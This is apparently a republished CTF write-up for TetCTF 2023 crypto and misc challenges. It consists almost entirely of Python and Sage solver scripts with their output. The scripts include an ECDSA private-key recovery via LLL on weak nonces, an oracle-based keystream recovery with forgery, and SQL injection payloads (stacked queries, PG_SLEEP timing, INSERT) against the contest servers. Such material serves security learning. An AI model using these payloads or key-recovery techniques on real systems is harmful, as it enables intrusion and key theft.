# TetCTF 2023 All crypto + misc(TetCTF) writeup by Neobeo

> 原文: https://www.ctfiot.com/89718.html
> ID: 89718


```
from pwn import *
from functools import reduce, cache
from tqdm import trange
from sage.all import *
from base64 import b64encode, b64decode
from collections import Counter
from Crypto.Util.number import bytes_to_long, long_to_bytes
import json, random

context.log_level = 'error'
with remote('192.53.115.129', 31338) as sh:
 def get(js):
 sh.sendline(json.dumps(js).encode())
 return sh.readline(False)

 get({"Recipient":"Casino","Command":"Register"})
 get({"Command":"Bet","Amount":-10**100})
 bal, proof = get({"Command":"ShowBalanceWithProof"}).decode().split()
 print(get({"Recipient":"FlagSeller","Command":"PrintFlag","Balance":
int(bal[:-1]),"Proof_Data":
proof}))
b'Your flag is: TetCTF{fr0m_n3g4t1v3n3ss_t0_b4nkruptcy}'
lines = '7dfdf6eba4da43bf7ca6eb64d3fbaac5e764b2c8e66e1f2a30e3b9e95b2ef48b28f105cdfc 3353e19ed6a3ecad7716831b8cc149ad3a1990c8f4682c434d1b7f417e7df9e9ca0743fc3a 2e15e68721c7773a920d9622cbad21b2d48e00358b1107b300ba19c3a48291dc1579eaf4f4 e0f6b4e61390ce8d1eab002af797eb022c58a6576ef55c78b917268b9fe4d3f45dfc7d5dc3 de11f01e825a69e5b1e004db1f79974ca9e42a2b0c0197dcb322f5a0e43cf7ddfdb529699d 976dbf67bf2f67fd947c69696c5ef5bb9186b8031d279165a5fcd1f6ac9d7f668b847ecfc0 01f123b89f75d3ab5f744caa4dd892eac598a0b1413cc0abf93509b2bc254a5714fd979f7a 488b3d4d110f2dca864f6589a58033cc23ca3618db8ce59f398b7b9a6dfd93220e1cd02538 6b92f7e54e6406b2d7d1176f5604e22cf4c6710ff35fa4cf7d33a7d1855a7f868da8713faa f9302dccf5c000ef69c2440fbe22b7eaeb5a95483dda09a0b0414e297ad81fb64fabc60025 c9b5dcf6031051d3433ddc358f7e18b3f7cec58b37bace17f2fd1e39b1cac64fbfcdbff2aa bddac6c00310a5c80cb73d640a1b0592ed5d99984971a085941e7ea8e2fd0e86aaa1b7098f 2ac7cdeb9e7eeb5abad2b4ed1238de39cb17aa4f4d8827ebd36d4a99acb9fb4e44cd365186 b38ed3a76f5751faaca88fbae7ef53a6a4baa4f29b4bca0ef782b373969d3df62d9c276d69 20f40b4267ae37f994dac8fccbb652d29abce709dc9f52223ddebe441899edfb8dc3a31a5d c9116855c08f1d04cbe6d86d0e9523c564fd3dd8bb79f7898ea7e624aba832e6530ad1231c b388f35a0f2009326bf66170156e57a36eea83285698fcdf2ba1fbbad199dc9d7860158d5e 1f8c81249a0428cd781494ada971c49e1cd7121af374ecc70d902ad0f4f736e4ef23f61fc9 b70d877d5ff8c38096faecb1de2df31ce467372c09c66c54b8e122123b539966937bb94d52 72951dcfda3601c762b4ea5119e40e93bbe7a595a35db985cb990f3bbcc74ddc7157f0baff ca0532f7df0239d0fe60e9a62852384f6cce737884808134fb1960e84803fb6ddc144df3c9 78f35e7e26df365e213787a3885ca11c76d14fb998d4a440826b2d8adaa5fe85065c9e9c0d f3110f509bd39e5ead882e85ccb31906809a0c29e33a79f0b3229e671dba1353c89968c4a4 2ac15e7a5dcc821c58ac08d526e5a350ef994bb485fc1c916f59e366e6f7e7ddc76b4a0cae 381a2afbc6aa95643248d8dd39c44fd7090746af9fa3f3c4f70ba56298d6ca1b36b7d19ec8 b098dfffe1cd19019ba9c472f6f966964352a958eda8707553021870ba51c9a0b573a59f99 02578a8b58c1e9c9d5f4321e0b8eb66922905ec2dfd3bf1a6ef583fcce8846243cf6c609d9 93efb1acf6b268c5a79746a28c64adbbbc81924991e13aa971d64f4087c87650ebb6309daa 9fcbff37a9919d676e6ce86d9bae8f75376b1a7a76de304c622fe163ea7549a8dcccb095f7 ad25c09cdcc768b53a519daf6f1a0861b4c9530cc9d0cf82fbf7c9f5a9acc2346d611a21d0 08aee3c019e664d88f3f1147c4f52d33f2f4ab9fea176625f24a14d517a1d59d338e5bf0aa 479de7e5e8e7841382bb7c9c844f7f8d900979bd360c6d84dc69bd17e7f4ced202afce5964 65c43c740e68be4ac64c559f09b461904be78fe5f5eaa6f78afb23a1d9c12ecf1d14a287a3 90063ef6a3b48091f514f1b87dc3ef40942989648043df1dda7d1221c0efea863f69f2fba6 e4c2976ec29fec9cc3d04ec5f4dde4e282886be0c5ee471ccb8cd201558adb759375c27d78 1ec9458af0857b6f437ee5d72de707eb6d38df96a830bb53775667f9722a46869e0954b5ad 5de6f6df232cc29f3fcaac177f323ecfd99732e7559f9d6ffdd706e387bcc23127891be4e1 7df2884288490b19fd7d20c746508c3ee8e77706c549ba5a07bf9cc183ede90e5cdd6cc59b 6ebc5d2caff2d0fc8afb538ea990f4289f716375834a67966dc6eba35b7559726826c23bd4 e6bdfbfe7f094d6ecfdf76433cfc3c64c5041ad8aeaf84ba5c8473b24d836f332e8e41eabe 6b845fefb8e5fe2253600c137047ee029a1bab28e9b45eda71597169148593938049092ee2 1172b4a57311da2ff968e1071c4eff0bd22a333cfdc8a6fdef41a4b98f69620152bbeb60b5 5a788ee6a476eaaa3f581eaebc2589efa640ac37fc5faa4f3591b7db58234dd8fb9743192d 07d49bf8af3cf3ac77db932a41b81d61736b7e8f5bb656b2a9637f57b7871c1297bf5e3b14 94d1d09e9c3d024538c4e5fedafbf5aed564d9998dec700647f704115f281efe74aefc0231 b11b4ff19b77cd69f1881e5401c6e56a9bbf2e88bb443b3340de8d01c4768c6efa34233b35 dfc7edc0fa6232d7df18717c9dec7631295a035afdeeea7e2dfaec3518e58c8189f65dd52f 5490e892fca7f4be4312ad69b1eed46e11cb94bf8bafd2ef725e77fd9620ba980fa1d46563 b9066eb49cb42ecfdcd9f7713e0feddb920043908df127cf35386df3b4bce6fab3c6a3e89f 8c51507ea79ffb2914436f8c9fa39501d89b8f9446cbe2fcfb0bada4886ff76b20ce1e29f3 6df94fc313b82da575073aeb54c35e5d3ff0c9dc7032cbffcc92b47b2fead75610d6157bca b92cf23e538fc6b3d1c0e28dd81f3c2a58d890bf323da321a39c9fb601caee4bcc1ccc9abd 0cc0985f966eb484c5f26b9bb8821dabf3b88d3471b55c6351a43fde32428519241a0ddd76 78cf7e7bf1ffa53812d1c9b47fc23852b2fcd318f7ea21dba12ad3a1d4f38e2ba1a5116aa9 e35e377f7972b49fbb82a42f90443ca77adb678fa278bf93046c8ec2bc05cb2155d5b506d6 3bc4ffa6eb16c6da6c40d78b132131092bc8f0696a81e14deca5018daea56c6678befbc1f8 138d167661180fc7b7c52fa821c518a29d41c5a73aee9969f74b096cff8fca7ead4f5affe9 3784f8b584545b1ef09aa3815182776966eb9d4758f25ae89550aee3916dce6f40d29c79ee 09913e8ed1778c95cbac302c86cc4ba5ad8b5fe113c78352d00979e84dcd10c3ecd036fba0 d1ed85304ea4a3e03233544efb85017c9cd1d3259d959acc0f0dbdaece9ed668d937d52309 e6b89393cfd0e888c8dce582495d216760eb1a8032103351d15c8033a46aae338a11ac99ee 92683cb1cb9f24a7925395f54be8b0e520ffd5afbc80c11256e33324bf2509a1c9b64f46dc 0b7e5204fba4ceec74ee7b35417ecb88fa8a74c6575bb6de8f15f1257b6e02a42e4b56dff0 49d609e06cb04aa787ebe99d741d4b60b909a00c0de6faecbf4c6d21559495a7c67060625d'.split()

random.seed(2023)
test = set()
for line in lines:
 x = list(range(37*8))
 random.shuffle(x)
 test.update(zip(x[::8], [b >> 7 for b in bytes.fromhex(line)]))

int(''.join([str(i) for _,i in sorted(test)]),2).to_bytes(37,'big')
b'TetCTF{____1nsuff1c13nt_3ntr0py_____}'
lines = 'af05a2ac3fa43be576a7c90a4ebfa5d9cfb98bc9a8970ffb2ead0fff9379e395d06199d5729bea 399d153c9f628af31d9e12d5bd8d5e0370a2e02fc45f7a84903806bac1e7e2cf15c9117b8a698e d461dbbd63f4543dd2e9b59927d442340afbede5796a7820d919596e8c42a086aed72b410478fe 41d278f4fc2e172ba8334464c5c60869f7e301f4b4175f731d0d209b0e41d64bc483f5eda239e7 9cd357b35f39d2b7f36b2bb019e8a446ff5fa4a38c7604fb08a5710680b77c08d13e7b1f11b864 ea93c40265df394a4b446b7ab06a8f38ab9d78209b2ae75716a9837a992ae789a90a0f8dd1482f d9528ede8bea699ed4f026f2cc375a638c7ec1ab3b0a1db3257297c5cfe718b7c39821e4192ec4 cb0d60203b6c931e4e9f16ff2cfce5e2bf921c9afc7dc555adaa8ad0e0809b85ea7949ec952d10 c64099f22f8d259e1ff95139c24160fdba5f73ecd64853c4dbb2904f73f5b7717926daf4666dcb fa0a112ac36a73718ca81d3acf740e5199277ccabf453b3a76cb09dc1e282aec21fc594ff526f3 c60fbcdb60877c0033e85a07163888798f47cc9f7ec427774971cd559a61c7342d867ce9eec6a9 badb8981a617997dd5f45f28aa88e1578b9b000fb7efba6c62e1aed24240de90773df2d0650d6b a5992d87e39cf86ef49ee2d8a5817b7227abbbc698fa7b0f3df69213b4deead4920914c38820a4 23a3efd42bdce31830f606a753ed6a3102f5d7ae2173ccaa83adc817488ebc3a355d647984a339 fa4c6f106e935f6ce2e8b46ca083afe6ceb40f6ec395e4de63dde75b568567a1d759a9860efbb8 0604703b44862b5ee8e6a24a94fc9df2764950cc20143e75811d4ca2054b9e8b27b0bd2b302920 2e124f3330924ee0eeb70eaa30619424cb6fa2958fff65577ddc6d32cc3435068903f9f3ba0d48 8163b5eab7c9dc5114a7b5e3c4be5f2d8723d903583499a3a23e09c749d9c2ccf880b657a8b66f 86905524dfca869789d605e046d5b50ed9f1fbefda4a6d35d7cbf87e445ea3744312c5add13059 dcaa9d4a2146d1f206d19b091745d160e253167f94838ced661844478f5fd68bafbc85a1617d8c 28cb751fbb04d32fa0fa07b6f811cf2c07dfcd084439c9eed5279ff91190a38271ceebd99a029f 9a06cfd74f831e5b990a5c80b9ccf8a66205d3b23135fc60a23a3cd443f40c1952168b2454b80d 493dc7b8e1c7a7e77971c89cb623047ba1cfd8f22715a79a608a6c0211f53a6fb9e353dffb471c 20558dada57c6bf41db4adcb76e8786a0edf83f32754cebf400d533027b29cc6e809b7bc4f9b88 aa20061213ffdf8c472834e82a6d619fdc4abb146b2f8fc08d698ab36d1a5dfcfb0869ae8b5ff5 c62c9691af6c398a8122126ff8edf24e758ece54050619f0ba70436c1b11f222f72f23540f030c fbd8bca4e3b79a73ccf72e823e3f54d9e07e5f0035946fb1ea28e10522e5c1f447cd9ae88478b5 acb426f38825507b32de15e4502bfaeb4198bb28262d367601af318b9fd482c2c2e9a46c4508aa b891b4f8231338e32911022605b02d5b4832c6ca8e3e243c4dcbb6e784e2219314fffeb8e6c86c 6c6a735cc72730abd0f3ab80ed766dbd042dea071798fc1da2d0f1150635a0a3a762e1629ed21e 52bd7994bf2de4c4de9dc6a6db8391eccffdba41c8720502dc127f4c379dc1ef0d1eb568d2f79c 9c41884cde75d6d059c9e3c4d259adb532be6fe720f7dedec1651164fc5cbb7bd5a62cc65042ab 5be48cb9203fd459fab80a2528e5e169a445ce86bf48d519446ce2ae8a675ac16c2dcf472438b8 d265c48a575434fc247840d318e2de626da9ce5f3c6e9977572cdf2f192494ab7ddd503943b5c7 2dc4dbb136acba7147f3cd1224072abe56b299360ccf2eceaded59869dce5070ac95776c358564 aeef2cabfb4f2acd681b4881270cf6e583a2127eeda90d9443d019d810903d2b423b1c5f39b16a ee1a4af6bf9695f7ae0b5024d230323fab2848c1f1c89f7854e03446a0d523286a64d4df06527c e815656072fcdf61292f6314bc6df3ded358b93ec5faa99cab55fe2470c45e9b854fb3fae236d6 28f0b3460ccb99ba6890adc1cc356c82999716ecb8fd62cd88fda5900393d473c01a7abcc7d295 07b9a78d3947be7f521a7b9e1e18f8873903469c3648cae9a8c1bf63f3f67b1e4cdb2429389680 5004b4bd239eb17da4ce4a35ab0d57a8464b7a586b6c999310ee9c500d91cbff1551f0642411c7 ea6585296ef3f035f35123bdfa34ce5f9935208a9f116d78ac367e980a8afdb5374e665fb7355e dbfd89c269251763bb015524a6f5b3662ba7092bae521ed55c3bb8f4ddbbccee2a64c576ce7838 b4327ebbea476d1a9761cbf87ce03f8999c1392c8fe87bf87a2af2823631d940d71c56000b30bf f55f487512cf947675b806b93e1e1e8dc98ccc07a86443f4b6726534d6c1215800a3db94fb8150 81485da4e069acf8f81326b4907c3b2a76e97af4c397f21453832d7e229706e100ec437e0aa123 4dfd1c8ba190ac619667e546abe851f9fe8dda2d25b75bdc372c82f445141133cfb437c8cfda8f 1a3c78b2ce36a2d1fc6667a7e980b03f15b7aafbc65a37e355f7a5f2b84ff1c0378da3ac9a0c8f 4f94d2be3b09c5f58578103de25d05baf401f03237e087ef005c3c8bfd03bae5a0bf80981d9836 800113bf74c97f5c17aff0126ba0737f3d0e339d761a002509097893f9f34814ee094a8b385cdb 7f202ff28a795b61a57ee08dcbad0a78471b6a20f02ef4ce5ee2be1f0d47da51f31d0dc4659183 3dab75b57e1a12bc4a47a16d818c4ec038e4c84942a4b8dabaade1fe4b17457a4b70921927811b 5d4bf5108126870c1b82a0f5cd0f39d2ac3185b7b24589bbfb33510a0bab57946146a33a7b7d00 e97e73d3a043bb8eca4b1899bf701218ade5fe50b4ded86d7f801ed23be02565fee8035305773f d726e1c17ddfd8302b6d113172864ffb9a7dc061c442f388a61f3bf9fd184ebb45888752e06f9c 189984469c2940cd49007eaa8633b0850ac895f9baa257b7052f9f3ee5fd378e719370f16c58a7 d5572c192699e2548bcb84029644b6aefab1fe63ed83cb4ebe5f97c4335a863a0f060af688ac09 2da13de259f28cb87e08d78d9ac3e17dbfbca9cc0a44012795e341d794d60979beb0f3ca38c9d9 c8cb809009d57524df86c4bea34d3a0763c8c6b359fde792fead665a135d7e1c9c50b3f5cbbf8a 62f49752e696eac2ef091880069915d7588c440d790757cd475f8c7f9674f0186ba7ccab6aaf4e 57ac751d3e8cad6303971170e50bf905a652e39cb5dc62c0d3015e3c62406970613248f642aa03 da6c84c73d1232df50ca09fe6060aaec2d56d02b64b9c7e73684a1cc2edd7395d7856b0b8b5d9b 4249f329b49b8d994ed26be3c00c49e81517a855fac3d682e07e753a8334e9a65a87bd797f9337 2629093413e7dc356eace3fb317306e849b55cd40972699d76dc1ad7c02766a354b9c67a7b464b'.split()

random.seed(2023)
test = Counter()
bias = b64decode('aaaa')
for line in lines:
 x = list(range(39*8))
 random.shuffle(x)
 test.update(zip(x, bits(xor(bytes.fromhex(line), bias))))

test = {a for a,b in test.items() if 2*b > len(lines)}
int(''.join([str(i) for _,i in sorted(test)]),2).to_bytes(39,'big')
b'TetCTF{fr0m_buggy_sw4p_t0_r4nd0m_b14s!}'
uint8_t user_entropy[32];
uint8_t system_entropy[32];
from crack_weak_ECDSA_nonces_with_LLL import order, make_matrix, privkeys_from_reduced_matrix

# secp256k1 parameters
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
E = EllipticCurve(GF(p),[0,7])
G = -E.lift_x(Integer(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798))
assert G[1] == 0X483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

# populate some data
data = []
for _ in trange(64):
 with remote('192.53.115.129', 31340) as sh:
 sh.send(bytes(48))
 data.append([bytes_to_long(b64decode(sh.readline(0)[3:]+b'=')) for _ in 'mrs'])

# find candidate keys using crack_weak_ECDSA_nonces_with_LLL
msgs = [m for m,r,s in data]
sigs = [(r,s) for m,r,s in data]
mat = make_matrix(msgs, sigs, None, 248)
keys = privkeys_from_reduced_matrix(msgs, sigs, None, mat.LLL())

# find the real key
m,r,s = data[0]
keys = [key for key in keys if ((m + r * key) * pow(s, -1, order) % order * G)[0] == r]
soln = b64encode(long_to_bytes(keys[0]))
print(soln)

# get the flag!
with remote('192.53.115.129', 31340) as sh:
 sh.send(soln)
 print(sh.readall())
100%|███████████████████████████████████████████████████████████████████████████████████| 64/64 [00:13<00:00, 4.80it/s]
Using: 64 sigs...
b'8JPNOogLTn8CPhlHzCkrywaSJciX5ygSkOff3P+kRes='
b'No way... TetCTF{0n3_byt3_0v3rfl0w_l34ds_t0_full_pr1v4t3_k3y_r3c0v3r}'
    #sh = process(['python', 'toy.py'])
sh = remote('192.53.115.129', 31337)

COUNT = 0
def send_input(payload):
 global COUNT
 COUNT += 1
 sh.sendline(base64.b64encode(payload))

def is_big():
 return b'modulo' in sh.readline()

sent = {}
def get_bigs(arr, splitter):
 for i in arr:
 pos, b0, b1 = splitter(i)
 if (pos, b0, b1) not in sent:
 send_input(bytes([0]*pos + [b0, b1] + [0]*30))
 for i in arr:
 t = splitter(i)
 if t not in sent:
 sent[t] = is_big()
 if sent[t]:
 yield i

def get_full(pos):

 n0 = 0
 lb, ub = 0, 65536
 for p in range(15)[::-1]:
 d = 1 << p
 k = (ub - lb) >> p # how many items to test
 arr = list(get_bigs(range(lb, ub, d), lambda i: (pos, i//256, i%256)))

 if len(arr) % 2 == 1:
 lone = reduce(lambda x,y:x^y, arr)
 ub = (lone | d) + d
 lb = (lone | d) - d
 n0 |= (k - len(arr) - 1) << p
 if p <= 7: break

 else:
 assert False, "rare failure"

 return n0 >> 8, (lb ^ n0) >> 8

def get_pos(pos, n0, next_byte):

 if n0 % 2 == 1:
 next_byte ^= 255

 lb, ub = 0, 256
 for p in range(8)[::-1]:
 d = 1 << p
 k = (ub - lb) >> p # how many items to test
 arr = list(get_bigs(range(lb, ub, d), lambda i: (pos, i, next_byte)))

 if 0 < len(arr) < k:
 assert len(arr) in {1,k-1}
 relevant_bit = n0 >> p & 1
 lone = reduce(lambda x,y:x^y, arr)

 if k == 2 and lone == lb and relevant_bit == 0:
 lb = lone + d
 elif (relevant_bit == 1) ^ (len(arr) != 1):
 lb = lone
 else:
 lb = lone - d
 ub = lb + d

 assert lb+1 == ub
 return lb ^ n0

xorpad = bytearray(96)
for i in trange(95, -1, -1):
 if i == 95:
 n0, xorpad[-1] = get_full(95)
 else:
 xorpad[i] = get_pos(i, n0, xorpad[i + 1])

xorpad.hex()
100%|███████████████████████████████████████████████████████████████████████████████████| 96/96 [03:14<00:00, 2.03s/it]
'8c1d9f7c1cf9cfc0019988a427b53185c34f5e03488d0f3526292a6558ddbf8be19e398674bf7c3da08be1f3439923ab895cebfa171ac9d4758d2746edebb8d9b99eba56c9ed9b98851f4ec397ccb27e3e755f664b18acb1be4e11809ba2a601'
lb = 0
ub = 1 << 256
def send_n(n):
 payload = xor(bytes([2]) + n.to_bytes(32, 'big'), xorpad, cut='min')
 send_input(payload)
 return is_big()

for _ in trange(256):
 mid = (lb + ub) // 2
 if send_n(mid):
 ub = mid
 else:
 lb = mid

assert lb + 1 == ub
n = ub
print(f'got {n = }')

orig = b'{"admin":"QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ"}'
residue=int.from_bytes(orig, 'big')%n

W1 = 2**128
W2 = 2**256
MAX = 52
mat = matrix(MAX+2,MAX+2)
for i in range(MAX):
 mat[i,i]=1
 mat[i,-2]=256**(2+i)*W1
mat[-2,-2]=n*W1
mat[-1,-2]=residue*W1
mat[-1,-1]=W2
lll_full = mat.LLL()
lll = mat.LLL()[-1]
assert lll[-1] > 0
assert lll[-2] == 0
magic = list(lll[:
MAX])
    #print(magic)

while True:
 try:
 lll2 = sum(v * random.randint(-2,2) for v in lll_full[:5]) + lll
 #lll2 = lll
 assert lll2[-1] > 0
 assert lll2[-2] == 0
 magic = list(lll2[:
MAX])
 #print(magic)

 test = bytearray(orig)
 for i in range(MAX):
 test[61-i] += magic[i]
 assert int.from_bytes(test, 'big')%n == 0 # assert this is zero

 json.loads(test)

 # if we reach here, that means we've won!
 send_input(xor(test + bytes(32), xorpad))
 print(f'Solved everything with exactly {COUNT} inputs')
 while line := sh.readline(False, 1):
 print(line)
 break
 
except Exception as e:
 #print(e)
 pass
100%|█████████████████████████████████████████████████████████████████████████████████| 256/256 [00:51<00:00, 4.96it/s]
got n = 91862111141993418166235582314029352910068581300447067345840034110089350445587
Solved everything with exactly 1529 inputs
b"b'TetCTF{____t0y_1s_just_t0y____}'"
import json, requests, time
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

key = b64decode('h1YAWSzDYdKkFnacIM7SaWEiHbUtothxUYSSDFl/OOU=')
iv = b64decode('eeYQ+h6TiWvWt9QCl5WwcQ==')

def jloads(data):
 try:
 return json.loads(data)
 
except Exception as e:
 print(f'{data} --> Json Exception {e}')

def encrypt(js):
 return b64encode(AES.new(key, AES.MODE_CBC, iv=iv).encrypt(pad(json.dumps(js).encode(), 16)))

def decrypt(data):
 return jloads(unpad(AES.new(key, AES.MODE_CBC, iv=iv).decrypt(b64decode(data)), 16))

#################################################################################################
HEADERS = {'Connection': 'close', 'Content-Type': 'text/plain; charset=utf-8'}

def get_categories():
 return jloads(requests.get('http://172.104.35.45:
9999/categories').content)

def get_products():
 return jloads(requests.get('http://172.104.35.45:
9999/products').content)

def get_categories_id(id):
 # this doesn't actually work, even if the original client
 return requests.get(f'http://172.104.35.45:
9999/categories/{id}').content

def get_profile(auth):
 return jloads(requests.get('http://172.104.35.45:
9999/profile', headers=HEADERS|{'Authorization':
auth}).content)

def post_login(user):
 # needs email and password
 return jloads(requests.post('http://172.104.35.45:
9999/login', headers=HEADERS, data=encrypt(user)).content)

def post_order(product, auth):
 return jloads(requests.post('http://172.104.35.45:
9999/order', headers=HEADERS|{'Authorization':
auth}, data=encrypt(product)).content)

def post_register(user):
 # needs name, email, and password
 return jloads(requests.post('http://172.104.35.45:
9999/register', headers=HEADERS, data=encrypt(user)).content)

# this one was not defined in the code, but is inferred from the return code of post_order
def get_order_img(order_img, auth):
 # order_img = '/order/70105' or something
 return requests.get(f'http://172.104.35.45:
9999' + order_img, headers=HEADERS|{'Authorization':
auth}).content
test_user = {'email': 'A', 'password': 'a'}
token = post_login(test_user)['access_token']
print(f'{token = }')
print(f'{get_profile(token) = }')
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyNjIsImlhdCI6MTY3Mjc5MTE1MCwiZXhwIjoxNjcyNzkyMDUwfQ.fMZM__dL7xee5XIBwbIsd6wM3Zy8anqLJk7sL6C11bQ'
get_profile(token) = {'avatar': 'https://i.imgur.com/x4kPhyf.png', 'email': 'A', 'name': 'A', 'coin': 1000}
post_order({'id':1}, token)
{'status': 'Success', 'order_img': '/order/218347'}
post_order({'id':6}, token) # flag
{'status': 'Fail'}
post_order({'id':1,'title':"'"}, token)
{'length': 92,
 'name': 'error',
 'severity': 'ERROR',
 'code': '42601',
 'position': '57',
 'file': 'scan.l',
 'line': '1176',
 'routine': 'scanner_yyerror'}
post_order({'id':1,'title':"');--"}, token)
{'length': 115,
 'name': 'error',
 'severity': 'ERROR',
 'code': '42601',
 'position': '28',
 'file': 'analyze.c',
 'line': '954',
 'routine': 'transformInsertRow'}
try:
 post_order({'id':1,'title':"',0,0);--"}, token)
except Exception as e:
 print(e)
 time.sleep(1)
('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
t0 = time.time()
try:
 post_order({'id':1,'title':"',0,0); SELECT 1 FROM PG_SLEEP(5); --"}, token)
except Exception as e:
 print(e)
 print(time.time() - t0)
 time.sleep(1)
('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
5.32434868812561
try:
 post_order({'id':1,'title':"',0,0); INSERT INTO orders (image) VALUES ('/flag'); --"}, token)
except Exception as e:
 print(e)
 time.sleep(1)
post_order({'id':1}, token)
('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
{'status': 'Success', 'order_img': '/order/218352'}
get_order_img('/order/218351', token)
b'TetCTF{R_u_4_f0rm3r_d3v_0f_th3_c0mp4ny?}\n'
```
